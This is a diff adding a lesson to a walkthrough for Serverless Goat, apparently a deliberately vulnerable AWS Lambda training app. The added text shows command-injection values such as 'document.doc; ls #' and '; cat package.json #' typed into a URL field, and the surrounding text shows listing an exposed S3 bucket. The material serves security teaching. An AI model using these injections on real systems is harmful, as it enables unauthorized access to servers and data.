@@ -128,7 +128,7 @@ So, the bucket is called: `aws-serverless-repository-serverless-goat-bucket-{str
 Let's try to request it. Just paste the bucket name in the following format, in your browser's URL line: `http://aws-serverless-repository-serverless-goat-bucket-{string}.s3.amazonaws.com/`
 
 You should get a full listing of the entire bucket contents. For example:
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>aws-serverless-repository-serverless-goat-bucket-{string}</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>0858ac61-cdcf-486e-93c4-c05d31e58f93</Key><LastModified>2018-12-18T12:03:22.000Z</LastModified>
 <ETag>&quot;ce1ed7ade5ee78fabeba4e31d307b67f&quot;</ETag><Size>2605</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>12776bf6-c034-4590-a1df-5dc8a5d9a810</Key><LastModified>2018-12-18T14:43:11.000Z</LastModified><ETag>&quot;f5c029f6b1af90e22f57a5cebbe14e47&quot;</ETag><Size>1942</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>14b7a569-6619-4117-8a01-4430b975b676</Key>
@@ -136,6 +136,35 @@ You should get a full listing of the entire bucket contents. For example:
 ...
 ```
 You can now try to browse other files in the bucket, belonging to other user's 'convert' operations by concatenating the uuid to the URL (that's the file name.
+
+### Lesson 6: Finding Known Vulnerabilities In Open Source Packages ###
+When we retrieved the source code of the Lambda function, we saw that it includes a dependency to the `node-uuid` NPM package: `const uuid = require('node-uuid');`
+
+However, we need to know the version of the uuid package. Lets run `ls -lF` on the AWS Lambda /var/task directory, and see what we can find - try the following value in the URL form field: `https://www.puresec.io/hubfs/document.doc; ls #`
+
+The results should be:
+```
+bin
+index.js
+node_modules
+package.json
+package-lock.json
+```
+Oops, the developer made a mistake and packaged the package.json file together with the function. Let's list its contents - use the following value in the URL form field: `https://www.puresec.io/hubfs/document.doc; cat package.json #`
+
+Results:
+```json
+{
+    "private": true,
+    "dependencies": {
+        "node-uuid": "1.4.3"
+    }
+}
+```
+
+
+
+
 
 
 
